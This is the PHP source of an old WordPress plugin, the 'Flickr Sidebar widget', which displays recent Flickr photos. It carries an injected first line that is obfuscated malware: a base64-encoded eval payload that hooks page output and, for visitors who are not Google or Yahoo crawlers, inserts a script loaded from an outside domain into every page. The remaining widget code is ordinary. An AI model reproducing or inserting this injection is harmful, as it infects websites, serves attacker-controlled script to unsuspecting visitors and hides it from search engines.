<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
/*
Plugin Name: Flickr Sidebar widget
Description: Adds a sidebar widget to display your recent Flickr photos
Author: Joe Tan
Version: 0.2.1
Author URI: http://www.tantannoodles.com/

$Revision: 135 $
$Date: 2008-04-28 17:52:23 -0400 (Mon, 28 Apr 2008) $
$Author: joetan54 $

*/

class TanTanFlickrWidget {
    function TanTanFlickrWidget () {
        if (function_exists('register_sidebar_widget')) { 
            register_sidebar_widget('Flickr Sidebar', array(&$this, 'display'));
            register_widget_control('Flickr Sidebar', array(&$this, 'control'));
        }
        $options = get_option('silas_flickr_widget');
        if ($options['animate']) {
            add_action('wp_head', array(&$this, 'animationHeader'));
            add_action('wp_footer', array(&$this, 'animationFooter'));
        }
    }
    
    function control() {
        require_once(dirname(__FILE__).'/lib.flickr.php');
        $flickr = new TanTanFlickr();
        $auth_token  = get_option('silas_flickr_token');
        $flickr->setToken($auth_token);
        $flickr->setOption(array(
            'hidePrivatePhotos' => get_option('silas_flickr_hideprivate'),
        ));
        $user = $flickr->auth_checkToken();

        
		$options = $newoptions = get_option('silas_flickr_widget');
		if ( $_POST['tantan-flickr-submit'] ) {
			$newoptions['title'] = strip_tags(stripslashes($_POST['tantan-flickr-title']));
			$newoptions['tags'] = strip_tags(stripslashes($_POST['tantan-flickr-tags']));
			$newoptions['count'] = (int) $_POST['tantan-flickr-count'];
			$newoptions['randomize'] = $_POST['tantan-flickr-randomize'] ? true : false;
			$newoptions['animate'] = $_POST['tantan-flickr-animate'] ? true : false;
		}
		if ( $options != $newoptions ) {
			$options = $newoptions;
			update_option('silas_flickr_widget', $options);
		}

        include(dirname(__FILE__).'/widget-options.html');
    }
    
    function animationHeader() {
        global $TanTanFlickrPlugin;
        include ($this->getDisplayTemplate('widget-header.html'));
    }
    function animationFooter() {
        
    }
    
    function display($args) {
			global $TanTanFlickrPlugin;
			if (!is_object($TanTanFlickrPlugin) || strtolower(get_class($TanTanFlickrPlugin)) != 'tantanflickrplugin' ) {
		    require_once(dirname(__FILE__).'/class-public.php');
				$TanTanFlickrPlugin =& new TanTanFlickrPlugin();
			}
			extract($args);
			$defaults = array('count' => 10);
			$options = (array) get_option('silas_flickr_widget');
			$altPhotos = array();
			foreach ( $defaults as $key => $value )
			if ( !isset($options[$key]) )
				$options[$key] = $defaults[$key];
			$photos;
			if ($options['randomize']) {
				$photos = $TanTanFlickrPlugin->getRandomPhotos($options['tags'], $options['count']);
			} else {
				$photos = $TanTanFlickrPlugin->getRecentPhotos($options['tags'], 0, $options['count']);
			}
			if ($options['randomize'] || $options['animate']) {
				if (count($photos) < $options['count']) {
					$altPhotos = $photos;
				} else {
					$altPhotos = array_slice($photos, $options['count']);
					$photos = array_slice($photos, 0, $options['count']);
				}
			}
			echo $before_widget;
			if ($options['animate']) {
				include ($this->getDisplayTemplate('widget-display-animate.html'));
			} else {
				include ($this->getDisplayTemplate('widget-display.html'));
			}
				echo $after_widget;
    }
    function getDisplayTemplate($file) {
        if (file_exists(TEMPLATEPATH . '/'.$file)) {
            return TEMPLATEPATH . '/'.$file;
        } else {
            return dirname(__FILE__).'/'.$file;
        }
    }
}
?>
